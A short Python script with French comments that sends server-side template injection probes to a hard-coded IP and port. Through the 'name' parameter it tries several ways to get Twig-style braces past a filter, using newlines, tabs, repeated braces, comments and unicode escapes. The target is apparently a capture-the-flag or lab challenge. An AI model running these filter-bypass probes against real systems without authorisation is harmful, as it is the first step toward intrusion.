import requests

url = 'http://51.159.16.22:8027/'

# Tester caractère par caractère
tests = [
    '{{',
    '}}',
    '{%',
    '%}',
    '{',
    '}',
    '{{7',
    '7}}',
    # Bypass avec newline
    '{\n{7*7}\n}',
    # Bypass avec tab
    '{\t{7*7}\t}',
    # Bypass répétition (str_replace une fois)
    '{{{7*7}}}',
    '{{{{7*7}}}}',
    # Bypass avec commentaire Twig au milieu
    '{#{7*7}#}',
    # Accolades unicode
    '\u007b\u007b7*7\u007d\u007d',
    # Injection via header
]

for t in tests:
    r = requests.get(url, params={'name': t})
    print(f'[{repr(t)}] → {r.text.strip()}')
